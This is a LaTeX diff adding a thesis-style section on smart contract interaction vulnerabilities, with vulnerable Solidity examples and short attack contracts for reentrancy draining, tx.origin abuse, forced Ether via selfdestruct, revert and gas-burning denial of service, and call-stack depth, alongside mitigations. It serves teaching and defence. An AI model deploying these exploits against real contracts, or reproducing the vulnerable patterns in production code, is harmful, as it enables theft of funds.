@@ -1,0 +1,164 @@
+\subsection{Contracts Interaction}
+When considering the interaction of smart contracts, a whole new set of additional vulnerabilities arises:
+
+\subsubsection{Reentrancy}
+Because of transactions being executed sequentially and atomically, a programmer might believe that a function can not be entered to before its execution has finished. This does not hold if the contract somehow calls another contract, because the called contract can \textit{re-enter} the caller during its execution. (see \cite[3.4 Reentrancy]{atzei:attacksurvey}) This becomes a problem, if after the call state variables of the contract are changed that would alter the behavior of the next call:
+
+Consider the following simple Wallet contract, where users can \mintinline{solidity}{deposit()} Ether, and later retrieve their stored amount (which is saved inside the \mintinline{solidity}{mapping balance}) using \mintinline{solidity}{withdraw()}. When \mintinline{solidity}{withdraw()} is executed, first the value stored in \mintinline{solidity}{balance} is sent to the user using the \mintinline{solidity}{call}-function, and afterwards set to \( 0 \).
+\begin{minted}{solidity}
+contract VulnerableWalletContract {
+    mapping(address => uint) balance;
+    
+    function deposit() public payable {
+        balance[msg.sender] += msg.value;
+    }
+    
+    function withdraw() public {
+        require(msg.sender.call.value(balance[msg.sender])());
+        balance[msg.sender] = 0;
+    }
+}
+\end{minted}
+
+The order of the statements inside \mintinline{solidity}{withdraw()} makes this contract susceptible to re-entrancy-attacks: If another smart contract interacts with \texttt{VulnerableWalletContract}, when transferring Ether in the first line of \mintinline{solidity}{withdraw()} its fallback function will be called. In there, the \mintinline{solidity}{withdraw()} function can be called - which has not yet set \mintinline{solidity}{balance[msg.sender]} to \( 0 \).
+
+This can be used in the contract, whose function exploiting this vulnerability is shown in the next code extract: If \mintinline{solidity}{attack(VulnerableWalletContract r)} is called with enough gas, more Ether than allowed by \mintinline{solidity}{balances} can be retrieved:
+\begin{minted}{solidity}
+function attack(VulnerableWalletContract r) public payable {
+    require(address(this).balance > 0);
+    r.deposit.value(address(this).balance)();
+    r.withdraw();
+}
+
+function () public payable {
+    if(gasleft() > 10000) {
+        VulnerableWalletContract(msg.sender).withdraw();
+    }
+}
+\end{minted}
+
+There are two possible solutions to this problem: First, the sub-calls should happen after the state variables have been changed, so that there is no advantage in re-entering the functions. Additionally, the gas sent along with the call can be restricted, so that there is not enough gas to call another contract. This is done by default when using \mintinline{solidity}{transfer} inside Solidity.
+
+\input{tex/04_vulnerabilities/04x01_dao.tex}
+
+\subsubsection{Using tx.origin}
+When checking the source of the transaction, there are two different ways to obtain the address of the caller: While \mintinline{solidity}{msg.sender} returns the address that directly called the current contract, \mintinline{solidity}{tx.origin} contains the address of the user that initiated the transaction.
+
+The later possibility can be problematic, since an exploit contract unintentionally called by the privileged address could then execute the vulnerable contract with the rights of the privileged account. In this example, the vulnerable contract can be killed by it's \texttt{owner} using:
+\begin{minted}{solidity}
+function kill(address heir) public  {
+    require(tx.origin == owner);
+    selfdestruct(heir);
+}
+\end{minted}
+
+If the \texttt{owner} of the vulnerable contract now calls \mintinline{solidity}{freeEther()} of the exploit, the contract will suicide and transfer its content to the attacker:
+\begin{minted}{solidity}
+function freeEther() public {
+    victim.kill(address(this));
+}
+\end{minted}
+
+This would not have happened, if \mintinline{solidity}{msg.sender} had been used, because it contained the address of the exploit. (see \cite[Security Considerations; tx.origin]{ethereum:solidity})
+
+\subsubsection{Modifyable Contract Balances}
+Another misconception that could irritate contract writers and people reading the source code is, that there a ways of transferring Ether to smart contracts the contract can't control -- and therefore a contract with no function accepting Ether can receive money and have a balance greater than \( 0 \). This is most likely to be exploited by fraudulent contract owners to scam their users in situations where a contract bases its actions on its balance, for example a token sale that sets the price of the tokens depending on the amount of funds raised.
+
+In the following three ways on how to transfer Ether into a contract avoiding function calls are presented:
+
+\paragraph{Contract Address as Coinbase}
+When mining Ethereum blocks, the address where the mining reward is transferred to (called \textit{coinbase}) can be set to any arbitrary address, so the address of a contract can be set there. Once a block is successfully mined, the reward is just added to the balance without executing the fallback function. (as described in \cite[Security Considerations; Sending and Receiving Ether]{ethereum:solidity})
+
+\paragraph{Selfdestruction}
+\texttt{SELFDESTRUCT} is a Ethereum Virtual Machine instruction that deletes the contract code from the state of the blockchain. When a contract self-destructs, its remaining balance is sent to a given address. When this happens, the balance is again just added to the receiving address, which does not execute the fallback function of smart contracts (as described in \cite[Security Considerations; Sending and Receiving Ether]{ethereum:solidity}).
+
+So the simplest way to force Ether into a smart contract without calling its fallback function is to deploy a simple exploit contract like the following one and then make it suicide sending the received Ether to the target contract:
+\begin{minted}{solidity}
+contract ForceEtherIntoContract {
+    function attack(address target) payable public {
+        selfdestruct(target);
+    }
+}
+\end{minted}
+
+\paragraph{Balance before Creation}
+When deploying a smart contract to the Blockchain, the address where the contract will be created is known before the transaction is broadcasted. Because of this, the contract creator can sent Ether to the address where the contract will be created at before the contract is deployed and the constructor is executed. (see \cite{uscc:secondplace})
+
+\subsubsection{Subcalls Stopping the Whole Transaction}
+Another danger especially when calling contracts at unknown addresses is, that the called function could fail and therefore revert the whole transaction.
+
+\paragraph{Reverts}
+The first way to revert a whole transaction from a subcall only works in the case of correctly propagated errors. When an exception is thrown or \mintinline{solidity}{revert()} is called in the subcall, in this case the error is re-thrown and therefore the whole transaction fails.
+
+To demonstrate this vulnerability, the \texttt{KingOfTheBachelorThesis}-contract in listing \ref{lst:interaction:kingofthebachelorthesis} can be used again with a slight modification: Instead of using \mintinline{solidity}{send}, which ignores exceptions, now \mintinline{solidity}{transfer} is used which propagates the errors correctly:
+\begin{minted}{solidity}
+current.refundAddress.transfer(address(this).balance);
+\end{minted}
+
+To retain the kingdom forever an exploit can be used that makes the sub-call launched in line \( 18 \) fail by not accepting Ether in the fallback function:\footnote{similar to \cite[section 4.2, second example]{atzei:attacksurvey}}
+\begin{minted}{solidity}
+contract KingForEver {
+    function () public payable {
+        revert();
+    }
+    
+    function attack(KingOfTheBachelorThesis kotbt) public payable {
+        kotbt.claim.value(address(this).balance)("Forever King!!!");
+    }
+}
+\end{minted}
+
+Because the transfer fails, the whole transaction is aborted and therefore the throne can't be claimed anymore.
+
+A solution to this problem is using the \texttt{withdraw}-pattern. Instead of sending the Ether directly, the Ether owned by the user will be saved (for example in a \mintinline{solidity}{mapping(address=>uint)}). The amount stored in that mapping can then be withdrawn by another function, that sends the user the amount of Ether stored in the mapping. Using this pattern only the affected contract that refuses to accept Ether won't be able to withdraw its money:
+\begin{minted}{solidity}
+mapping(address => uint) public balances;
+
+function withdraw () public {
+    uint withdrawerBalance = balances[msg.sender];
+    require(withdrawerBalance > 0);
+    balances[msg.sender] = 0;
+    msg.sender.transfer(withdrawerBalance);
+}
+\end{minted}
+
+This is also the case, if instead of \mintinline{solidity}{transfer()} calls to functions of the contract are made, which was abused in the example of section \ref{section:honeypot:library}.
+
+\paragraph{Out of Gas}
+Another way the whole transaction could be prevented by a sub-call is using up all the gas: Since \mintinline{solidity}{transfer} and \mintinline{solidity}{send} limit the transferred gas to \( 2300 \), this can be only used with the call-command that transfers all the available gas:
+\begin{minted}{solidity}
+current.refundAddress.call.value(address(this).balance)();
+\end{minted}
+
+Instead of calling \mintinline{solidity}{revert()} in the fallback function, now all the remaining gas is burnt by an infinite loop doing gas-expensive memory-operations:
+\begin{minted}{solidity}
+uint valueInStorage = 0;
+function () public payable {
+    while(true) { valueInStorage++; }
+}
+\end{minted}
+
+Because of this, the subcall will fail, so that the execution of the caller continues. But since the gas provided by the sender has been used up, the whole transaction will fail and be reverted.
+
+\subsubsection{Maximal Callstack-Depth}
+The call stack used by the Ethereum Virtual Machine is limited \( 1024 \) elements - if on level \(1024 \) another function is called, the call fails.
+
+This property could be used until 18th of October 2016 by writing an exploit-contract that recursively builds up the stack to a height of \( 1023 \) and then calls a function of the target contract. When executing that function on stack height \( 1024 \), every call made fails, which becomes a problem if the exceptions are not handled properly. (see \cite[Page 11 (Stack Size Limit)]{atzei:attacksurvey})
+
+In the case of \texttt{KingOfTheBachelorThesis} from listing \ref{lst:interaction:kingofthebachelorthesis} this error could be used to make the transfer of the compensation to the new king fail, which would -- as soon, as the throne is claimed again -- result in thief receiving the compensation for his predecessor.
+\begin{minted}{solidity}
+function attack() payable public { attackRecursion(1022); }
+
+function attackRecursion(uint depthLeft) internal {
+    if (depthLeft == 0) {
+        victim.claim.value(address(this).balance)("Evil king!");
+    } else {
+        attackRecursion(depthLeft - 1);
+    }
+}
+\end{minted}
+
+This vulnerability was addressed in EIP 150 (see \cite{ethereum:eip150}): With every call increasing the height of the stack, only about \( \frac{63}{64} \) of the gas available for execution can be sent along. Because of this, getting to a call depth of \( 1023 \) to conduct this attack would only leave  about\( \left( \frac{63}{64} \right)^{1023} \approxeq 1 \cdot 10^{-7} \) of the gas sent with the initial call. Due to the block gas limit, only enough gas to reach a stack height of about \( 340 \) can be reached, so that this attack now has become practically impossible.
+
+% \subsubsection{Wrong memory layout in library}
+% Explain, how a different layout in the library context could become a problem
